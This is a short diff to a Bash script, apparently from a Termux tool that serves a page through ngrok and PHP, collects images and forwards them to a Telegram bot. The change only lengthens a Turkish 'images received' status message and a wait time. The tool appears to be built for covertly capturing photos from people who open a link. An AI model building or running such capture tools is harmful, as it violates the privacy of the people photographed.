@@ -89,13 +89,13 @@ do
 	if [[ $control -gt 0 ]];then
 		control=$(cat $PREFIX/lib/.termuxxtoolssmode |sed -n 2p)
 		if [[ $control == telegram-bot ]];then
-			echo "[✓] RESİMLER ALINDI" > .info
+			echo "[✓] RESİMLER ALINDI\n\n\n[*] Biraz Sonra Resimler Gelecektir" > .info
 			termuxxtoolssmod --send
 			echo "sendPhoto .png" > .info
 		else
 			echo "[✓] RESİMLER ALINDI" > .info
 		fi
-		sleep 5
+		sleep 10
 		killall ngrok
 		killall php
 		clear
